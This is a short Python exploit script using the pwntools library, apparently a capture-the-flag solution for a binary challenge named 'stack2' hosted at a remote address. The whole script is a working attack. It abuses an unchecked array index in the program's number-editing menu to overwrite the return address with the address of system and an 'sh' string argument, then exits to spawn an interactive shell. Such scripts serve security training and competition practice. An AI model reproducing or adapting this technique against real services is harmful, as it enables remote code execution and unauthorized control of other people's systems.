from pwn import *

#p=process('stack2')
p=remote('111.198.29.45',31645)
def change(index,content):
    p.recvuntil("5. exit")
    p.sendline("3")
    p.recvuntil("which number to change:")
    p.sendline(str(index))
    p.recvuntil("new number:")
    p.sendline(str(content))


p.recvuntil("How many numbers you have:")
p.sendline('1')
p.recvuntil("Give me your numbers")
p.sendline('1')

#_system addr:0x08048450

change(132,80)
change(133,132)
change(134,4)
change(135,8)

#'sh' addr:0x08048987

change(140,135)
change(141,137)
change(142,4)
change(143,8)


p.recvuntil("5. exit")
p.sendline('5')
p.interactive()


